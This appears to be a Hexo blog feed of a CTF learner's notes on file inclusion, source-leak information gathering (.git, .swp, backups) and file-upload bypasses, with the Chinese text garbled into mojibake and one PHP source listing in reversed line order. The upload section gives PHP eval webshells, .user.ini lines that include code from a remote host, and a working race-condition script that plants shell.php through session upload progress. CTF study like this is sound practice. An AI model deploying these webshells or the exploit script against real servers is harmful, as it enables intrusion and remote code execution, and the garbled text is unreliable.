ä½†æ˜¯ä¸ä¼šéƒ¨ç½²çœŸçš„æ˜¯éš¾å—ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>æ‰€ä»¥é—®é¢˜å°±æ˜¯æˆ‘æ‹¿ä¸åˆ°é¢˜ç›®çš„ç¯å¢ƒï¼Œæ‰€ä»¥åªèƒ½çœ‹åˆ«äººçš„WPç…§ç€åšï¼Œåæ­£æˆ‘ä¹Ÿæ„Ÿè§‰æœ‰é¢˜ç›®è¿™ä¹Ÿè‚¯å®šåšä¸å‡ºæ¥ï¼Œæ€è·¯å°±æ²¡æœ‰å¼€é˜”</p><p>æ‰€ä»¥å°±åšä¸€æ¬¡å¯¹åˆ«äººWPçš„reaction</p><p>ç¬¬ä¸€ç‚¹ï¼šé¢˜ç›®ç•Œé¢æ—¶ä¸Šä¼ å›¾ç‰‡ï¼Œé¦–å…ˆå°è¯•ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œç„¶åurlå˜æˆurl?fp=uploadï¼Œæ‰€ä»¥å¤§ä½¬çŒœæƒ³åº”è¯¥ä¸ºincludeï¼ˆ$fp+â€™.phpâ€™ï¼‰å…¸å‹çš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä»uploadå¯ä»¥ç›´æ¥æ‰æƒ³åˆ°includeæ–‡ä»¶åŒ…å«ï¼Œå¹¶ä¸”é¢˜ç›®æç¤ºè¿˜æ˜¯åœ¨æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼ŒçœŸçš„æ˜¯å‰å®³ã€‚æ¥ä¸‹æ¥ä½¿ç”¨phpï¼š//filter/read=convert.base64-encode/resource=home.phpè¯»çš„æºç ã€‚</p><p><img src="1.PNG"><br>web34</p><p>æ¥ä¸‹æ¥å­¦ä¸€ç‚¹æ–°çš„çŸ¥è¯† </p><h3>Pharçªç ´æ–‡ä»¶åŒ…å«</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æ”¶é›†</title>
      <link href="/2021/05/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/"/>
      <url>/2021/05/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>æˆ‘è¦æ‹¾èµ·ä»0åˆ°1ctferæˆé•¿ä¹‹è·¯äº†</p><span id="more"></span><h2>ä¿¡æ¯æ”¶é›†å¾—é‡è¦æ€§</h2>å…¶å®æˆ‘åœ¨åšè¿‡å¾—æœ‰å…³äºä¿¡æ¯æ”¶é›†å¾—é¢˜ç›®ä¸»è¦å°±æ˜¯ï¼Œwww.zipæºç æ³„éœ²ï¼Œgitæºç æ³„éœ²ï¼Œä»¥åŠrobots.txtï¼Œä»¥å‰å»åšä¿¡æ¯æ”¶é›†ç›¸å…³é¢˜ç›®çš„è”ç³»çš„æ—¶å€™æœ‰ç¢°è§è¿‡.swpç›¸å…³çš„é¢˜ç›®ã€‚æ‰€åšçš„é¢˜ç›®å¦‚æœæ˜¯å…³äºä¿¡æ¯æ³„éœ²çš„ï¼Œé‚£ä¹ˆä¿¡æ¯æ”¶é›†çš„å·¥ä½œå¿…éœ€åœ¨å‰æœŸå±•å¼€ï¼Œå¦åˆ™æ‹¿ä¸åˆ°æºç é¢˜ç›®å°±æ— æ³•è¿›è¡Œä¸‹å»ã€‚<h1>æ•æ„Ÿç›®å½•æ³„éœ²</h1><h2>gitæ³„éœ²</h2>[æ¼æ´ä»‹ç»]ï¼šgitæ˜¯ä¸€ä¸ªä¸»æµçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­ç»å¸¸å¿˜è®°.gitæ–‡ä»¶å¤¹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡.gitæ–‡ä»¶å¤¹ä¸­çš„ä¿¡æ¯è·å–å¼€å‘äººå‘˜æäº¤è¿‡çš„æ‰€æœ‰çš„æºç ã€‚<p>æˆ‘åšè¿‡çš„é¢˜ç›®é‡Œè¾¹å°±æ˜¯ç”¨æ‰«æå·¥å…·æ‰«å‡ºæ¥.gitæ³„éœ²ï¼Œç„¶åé€šè¿‡Githackæ¥è·å–.gitæ–‡ä»¶</p><p>ç›¸å…³é¢˜ç›®ï¼š</p><h2>ç²—å¿ƒçš„å°æ</h2><p><img src="1.PNG"></p><p>é¢˜ç›®å¼‚å¸¸ç®€å•ï¼Œå°±æ¢å¤ä¹‹åï¼Œæ‰“å¼€index.htmlå°±å¯ä»¥äº†</p><p><img src="2.PNG"></p><p>æˆ‘è‡ªå·±è·Ÿä¸€ä¸ªå‚»å‰ä¼¼çš„ï¼Œæ˜æ˜æœ‰ä¸€ä¸ªindex.htmlä¸æ‰“å¼€éè¦æƒ³ç€å»è¿˜åŸgitä¹‹å‰ç‰ˆæœ¬ã€‚ã€‚ã€‚ã€‚ã€‚</p><h2>git å›æ»š</h2><p>gitä½œä¸ºä¸€ä¸ªç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œä¼šè®°å½•æ¯ä¸€æ¬¡æäº¤commitçš„ä¿®æ”¹ï¼Œæ‰€ä»¥å½“é¢˜ç›®ä¸­å­˜åœ¨gitæ³„éœ²æ—¶ï¼Œflagï¼ˆæ•æ„Ÿï¼‰å¯èƒ½åœ¨ä¿®æ”¹ä¸­è¢«åˆ é™¤æˆ–è€…æˆ–è¢«è¦†ç›–äº†ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥éœ€ç”¨è¿ç”¨å‘½ä»¤æ¥æŸ¥çœ‹ä»¥å‰çš„ç‰ˆæœ¬</p><p><img src="3.PNG"></p><blockquote><p>git init åˆå§‹åŒ–ä¸€ä¸ªä»“åº“</p></blockquote><blockquote><p>git add flag.phpæ·»åŠ ä¸€ä¸ªç©ºçš„æ–‡ä»¶,å°†æ–‡ä»¶æ”¾åœ¨äº†æš‚å­˜åŒº</p></blockquote><blockquote><p>echo â€œflag{hahaha}â€ &gt; flag.php è¿ç”¨é‡å®šå‘å°†å†…å®¹è¾“å…¥åˆ°flag.phpé‡Œé¢</p></blockquote><blockquote><p>git commit -m â€œæ³¨é‡Šâ€ å°±æ˜¯å°†æš‚å­˜åŒºçš„å†…å®¹æäº¤åˆ°å½“å‰åˆ†æ”¯ä¸­</p></blockquote><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡git reflogæ¥è·å–æäº¤è®°å½•</p><p><img src="4.PNG"></p><p>ç„¶åé€šè¿‡ git diff HEAD ç‰ˆæœ¬å·ï¼Œæ¥æŸ¥çœ‹æ¯”è¾ƒå½“å‰ç‰ˆæœ¬ä¸æƒ³æŸ¥çœ‹çš„commitå‘ç”Ÿçš„å˜åŒ–</p><p><img src="5.PNG"></p><p>ä¹Ÿå¯ä»¥é€šè¿‡ git reset â€“hard HEAD^æ¥è¿›è¡ŒæŸ¥çœ‹</p><p><img src="6.PNG"></p><h2>gitåˆ†æ”¯</h2><p><img src="7.PNG"></p><p>å…¶å®è¿™å¼ å›¾é‡Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬å¸¸ç”¨çš„åˆ†æ”¯å°±æ˜¯masterï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æ‰§è¡Œgit reflog çœ‹åˆ°æœ‰<code> moving from secret to master</code>ï¼Œè¿™é‡Œé¢æ—¶è—æœ‰secretï¼Œä½†æ˜¯æˆ‘ä»¬ä½¿ç”¨å·¥å…·githackæ—¶å›å¤ä¸å‡ºæ¥çš„ï¼Œæ‰€ä»¥è¿™æ˜¯éœ€è¦æ‰‹åŠ¨ä¸‹è½½wget url /.git/refs/heads/secretï¼Œè¿™ç‚¹æš‚æ—¶ç­‰åˆ°é‡åˆ°ç±»ä¼¼çš„é¢˜ç›®çš„æ—¶å€™åœ¨è¯´å§</p><h2>svnæ³„éœ²</h2>svnæ˜¯æºä»£ç ç®¡ç†è½¯ä»¶ï¼Œé€ æˆsvnæ³„éœ²çš„åŸå› æ˜¯ç®¡ç†å‘˜çš„ä¸è§„èŒƒæ“ä½œå°†svnéšè—æ–‡ä»¶å¤¹æš´éœ²äºå¤–ç½‘ç¯å¢ƒ<h2>HGæ³„éœ²</h2>åœ¨åˆå§‹åŒ–é¡¹ç›®æ—¶ï¼ŒHGä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ª.hgéšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«äº†ä»£ç å’Œåˆ†æ”¯ä¿®æ”¹ä¿¡æ¯ã€‚<h2>å°tips</h2><p>æœ‰æ—¶å€™æ˜æ˜æ˜¯gitæ³„éœ²ä½†æ˜¯åœ¨urlåé¢åŠ ä¸Š.gitå´æ˜¯å‡ºé”™ï¼Œè¿™æ—¶å¦‚æœæˆ‘ä»¬åœ¨.git/åé¢åŠ ä¸Šconfigï¼Œæœ‰ä¿¡æ¯è¿”å›è¡¨æ˜å°±æ˜¯.gitæ³„éœ²ï¼Œä¸Šè¿°é—®é¢˜çš„å‡ºç°åº”è¯¥æ—¶æœ‰å…³äºé‡å®šå‘</p><h1>æ•æ„Ÿå¤‡ä»½æ–‡ä»¶</h1><h2>geditå¤‡ä»½æ–‡ä»¶</h2>äº§ç”Ÿçš„æ–‡ä»¶åé¢å¸¦ä¸Šâ€œ~â€å¦‚ï¼šindex.php~<p><img src="11.PNG"></p><h2>vimå¤‡ä»½æ–‡ä»¶</h2><p>æˆ‘åšçš„é¢˜ç›®é€šå¸¸å°±æ—¶æŸ¥çœ‹.index.php.swpï¼ˆç¬¬ä¸€æ¬¡æ„å¤–é€€å‡ºï¼‰</p><p><img src="8.PNG"></p><p>å»ºè®®æ–‡ä»¶ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œæˆ‘ç”¨nodepayæ‰“å¼€å°±å…¨æ˜¯nulï¼Œæœ¬æ¥ä¹Ÿå°±èƒ½æ‰¾åˆ°flagï¼Œæ°”æ­»äº†</p><p><img src="9.PNG"></p><p><img src="10.PNG"></p><p>è¿™æ˜¯å› ä¸ºå¦‚æœç”¨æˆ·åœ¨ç¼–è¾‘æ–‡ä»¶å¼‚å¸¸é€€å‡ºçš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œæ–‡ä»¶åä¸ºï¼š.æ–‡ä»¶å.swp</p><p>*.swoç¬¬äºŒæ¬¡æ„å¤–é€€å‡º</p><p>*.swnç¬¬ä¸‰æ¬¡æ„å¤–é€€å‡º</p><h2>å¸¸è§„çš„ä¸€äº›æ–‡ä»¶</h2><p>robots.txt:è®°å½•ä¸€äº›ç›®å½•å’ŒCMSç‰ˆæœ¬ä¿¡æ¯</p><p>readme.mdï¼šè®°å½•cmsç‰ˆæœ¬ä¿¡æ¯ï¼Œæœ‰çš„ç”šè‡³æœ‰githubåœ°å€</p><p><a href="http://www.zip/rar/tar.gz%EF%BC%9A%E5%BE%80%E5%BE%80%E6%98%AF%E7%BD%91%E7%AB%99%E7%9A%84%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD">www.zip/rar/tar.gzï¼šå¾€å¾€æ˜¯ç½‘ç«™çš„æºç å¤‡ä»½</a></p><h1>bannerè¯†åˆ«</h1><p>è¿™ä¸ªå°±è¦çœ‹å¹³æ—¶çš„ç§¯ç´¯äº†ï¼Œ</p><p>å¦‚æœæ—¶thinkphpçš„webæ¡†æ¶ï¼Œæˆ‘é—·å°±å¯ä»¥å°è¯•thinkphpç›¸å…³æ¼æ´</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfer-æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2021/05/06/ctfer-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/05/06/ctfer-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰ç«¯æ ¡éªŒ"><a href="#å‰ç«¯æ ¡éªŒ" class="headerlink" title="å‰ç«¯æ ¡éªŒ"></a>å‰ç«¯æ ¡éªŒ</h1><p>åç«¯æ— éªŒè¯</p><p><img src="1.PNG" alt="image-20211206212510918"></p><hr><h1 id="åç«¯æ•ˆéªŒ"><a href="#åç«¯æ•ˆéªŒ" class="headerlink" title="åç«¯æ•ˆéªŒ"></a>åç«¯æ•ˆéªŒ</h1><p>åç«¯æ•ˆéªŒæœ‰ä¸‰ä¸ªç‚¹</p><ul><li>æ–‡ä»¶åç§°ï¼šfilename</li><li>æ–‡ä»¶ç±»å‹ï¼šContent-Type</li><li>æ–‡ä»¶å†…å®¹</li></ul><ul><li><p><img src="2.png" alt="image-20211206213149438"></p><h3 id="æ”¹æ–‡ä»¶åï¼š"><a href="#æ”¹æ–‡ä»¶åï¼š" class="headerlink" title="æ”¹æ–‡ä»¶åï¼š"></a>æ”¹æ–‡ä»¶åï¼š</h3><p>æ”¹å¤§å°å†™pHPï¼ˆæ³¨æ„åœ¨linuxä¸‹åç¼€åæ•æ„Ÿ,äºæ˜¯å¤§å†™ä¸èƒ½è¢«è§£æï¼‰,php3,php5</p><p>ä½¿ç”¨%00è¿›è¡Œæˆªæ–­</p><p><img src="3.png" alt="image-20211206215341266"></p></li></ul><h3 id="æ”¹æ–‡ä»¶ç±»å‹"><a href="#æ”¹æ–‡ä»¶ç±»å‹" class="headerlink" title="æ”¹æ–‡ä»¶ç±»å‹"></a>æ”¹æ–‡ä»¶ç±»å‹</h3><p>  Content-Type: image/png</p><p>  Content-Type: images/png<br>  Content-Type: images/jpeg</p><p>  ç”¨GIF89Aè¿›è¡Œç»•è¿‡getimagesizeçš„åˆ¤æ–­;</p><p>  #define width 1337<br>  #define height 1337</p><h3 id="æ–‡ä»¶é­”æœ¯å­—èŠ‚æ¬ºéª—"><a href="#æ–‡ä»¶é­”æœ¯å­—èŠ‚æ¬ºéª—" class="headerlink" title="æ–‡ä»¶é­”æœ¯å­—èŠ‚æ¬ºéª—"></a>æ–‡ä»¶é­”æœ¯å­—èŠ‚æ¬ºéª—</h3><p>  æ”¹äºŒè¿›åˆ¶ç”¨89 50 4e 4cï¼ˆpngçš„ï¼‰è¿›è¡Œç»•è¿‡</p><h3 id="ä½¿ç”¨-user-iniè¿›è¡Œä¸Šä¼ ï¼ˆé…ç½®æ–‡ä»¶å¯æ§ï¼‰"><a href="#ä½¿ç”¨-user-iniè¿›è¡Œä¸Šä¼ ï¼ˆé…ç½®æ–‡ä»¶å¯æ§ï¼‰" class="headerlink" title="ä½¿ç”¨.user.iniè¿›è¡Œä¸Šä¼ ï¼ˆé…ç½®æ–‡ä»¶å¯æ§ï¼‰"></a>ä½¿ç”¨.user.iniè¿›è¡Œä¸Šä¼ ï¼ˆé…ç½®æ–‡ä»¶å¯æ§ï¼‰</h3><p>  ä½¿ç”¨çš„æ¡ä»¶æ˜¯ä¸Šä¼ çš„ç›®å½•é‡Œé¢éœ€è¦å­˜åœ¨.phpæ–‡ä»¶</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 20</span><br><span class="line">#define height 10</span><br><span class="line"></span><br><span class="line">auto_prepend_file&#x3D;shell.jpg</span><br></pre></td></tr></table></figure><p>  ç„¶å</p><p>  <img src="5.png" alt="image-20211206220406137"></p><p>  ç„¶åè®¿é—®ä¸Šä¼ ç›®å½•ä¸­å­˜åœ¨çš„çš„.phpæ–‡ä»¶ï¼Œå³å¯</p><h3 id="æ”¹æ–‡ä»¶å†…å®¹"><a href="#æ”¹æ–‡ä»¶å†…å®¹" class="headerlink" title="æ”¹æ–‡ä»¶å†…å®¹"></a>æ”¹æ–‡ä»¶å†…å®¹</h3><ul><li><p>phpè¢«è¿‡æ»¤ï¼Œä½¿ç”¨<code>&lt;?=eval($_POST[1]);?&gt;</code></p></li><li><p>åˆ†å·è¢«è¿‡æ»¤ï¼šåœ¨phpè„šæœ¬ä¸­æœ€åä¸€ä¸ªåˆ†å·å¯ä»¥çœç•¥</p></li><li><p>&lt;è¢«è¿‡æ»¤ï¼šä¸Šä¼ .user.iniï¼Œauto_append_file=â€<a href="http://139.224.40.131/&quot;,%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89index.php%E7%9A%84%E8%AF%9D%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%85%88%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AAindex.php">http://2346723459/&quot;,å¦‚æœæ²¡æœ‰index.phpçš„è¯æˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ªindex.php</a></p></li><li><p>æ‹¬å·è¢«è¿‡æ»¤ï¼š</p><p><code>&lt;?=include &#39;/var/lo&#39;.&#39;g/nginx/access.l&#39;.&#39;og&#39;?&gt;</code></p><ul><li><p>å¦‚æœç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼š<code>&lt;?=include1(äºŒè¿›åˆ¶æ”¹ä¸º0d)&#39;/var/lo&#39;.&#39;g/nginx/access.l&#39;.&#39;og&#39;?&gt;</code></p></li><li><p>å¦‚æœç‚¹ä¹Ÿè¢«è¢«è¿‡æ»¤ï¼Œ&lt;?=include1(äºŒè¿›åˆ¶æ”¹ä¸º0d)â€™<a href="http://139.224.40.131/&#39;?\&gt;">http://2346723459/&#39;?\&gt;</a></p><p>â€‹    å…³é—­apacheï¼Œç„¶åå¯åŠ¨è·¯ç”±å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># å¯¹ç”¨æˆ·è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">app.secret_key = <span class="string">&#x27;*************************&#x27;</span></span><br><span class="line"><span class="comment"># é¦–é¡µè·¯ç”±</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥ä¸Šä¼ .user.ini   auto_append_file=â€™<a href="http://139.224.40.131/&#39;">http://2346723459/&#39;</a></p></li><li><p>å¯ä»¥ä½¿ç”¨sessionè¿›è¡Œæ–‡ä»¶åŒ…å«</p><ol><li><p>é¦–å…ˆä¸Šä¼ .user.ini</p></li><li><p>ç„¶åä¸Šä¼ shell</p></li><li><p>æ¡ä»¶ç«äº‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.user.ini</span></span><br><span class="line">GIF89A</span><br><span class="line">auto_append_file=<span class="string">&quot;shell&quot;</span></span><br><span class="line"><span class="comment">#shell</span></span><br><span class="line">GIF89A</span><br><span class="line"><span class="meta">&lt;?</span>include1(äºŒè¿›åˆ¶æ”¹ä¸º<span class="number">0</span>d)<span class="string">&quot;/tmp/sess_lucky&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#ç«äº‰è„šæœ¬</span></span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://69d76cb9-b8a9-498d-95c4-4a8da2d018ca.node4.buuoj.cn:81/flflflflag.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;lucky&#x27;</span></span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="subst">$_POST</span>[cmd])?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(f<span class="string">&#x27;&#123;host&#125;?file=/tmp/sess_&#123;sessid&#125;&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> not in response.text:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(response.text)</span><br><span class="line">            sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure></li></ol></li></ul></li><li><p>æ–¹æ‹¬å·è¢«è¿‡æ»¤</p><ul><li>ä½¿ç”¨èŠ±æ‹¬å·è¿‡æ»¤ï¼ˆè¿™æ˜¯ä¸è§„èŒƒçš„å†™æ³•ï¼Œphp8ä»¥ä¸Šæˆ–æ›´é«˜ç‰ˆæœ¬æœ‰å¯èƒ½ç”¨ä¸äº†ï¼‰</li><li>ä½¿ç”¨array_pop : <code>&lt;?=eval(array_pop($_POST));?&gt;</code></li></ul><h3 id="å°±ä¸‰ä¸ªç±»å‹å¾ªç¯çš„è¿›è¡Œæ£€æµ‹ï¼Œçœ‹æ˜¯å“ªä¸ªåœ°æ–¹è¢«è¿‡æ»¤äº†"><a href="#å°±ä¸‰ä¸ªç±»å‹å¾ªç¯çš„è¿›è¡Œæ£€æµ‹ï¼Œçœ‹æ˜¯å“ªä¸ªåœ°æ–¹è¢«è¿‡æ»¤äº†" class="headerlink" title="å°±ä¸‰ä¸ªç±»å‹å¾ªç¯çš„è¿›è¡Œæ£€æµ‹ï¼Œçœ‹æ˜¯å“ªä¸ªåœ°æ–¹è¢«è¿‡æ»¤äº†"></a>å°±ä¸‰ä¸ªç±»å‹å¾ªç¯çš„è¿›è¡Œæ£€æµ‹ï¼Œçœ‹æ˜¯å“ªä¸ªåœ°æ–¹è¢«è¿‡æ»¤äº†</h3></li></ul><hr><h1 id="å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"><a href="#å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"></a>å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#éƒ¨åˆ†æºç </span></span><br><span class="line">ho json_encode(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;æ–‡ä»¶ç±»å‹ä¸åˆè§„&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">            &#125;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;åªå…è®¸ä¸Šä¼ pngæ ¼å¼å›¾ç‰‡&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>);</span><br><span class="line">                    imagepng(<span class="variable">$png</span>,<span class="variable">$dst</span>);</span><br><span class="line">                    <span class="variable">$dst</span> = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;æ–‡ä»¶ç±»å‹ä¸åˆè§„&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$png</span>==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                <span class="variable">$png</span> = imagecreatefrompng(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$ext_suffix</span>, <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>)))&#123;</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="variable">$arr</span> = pathinfo(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span 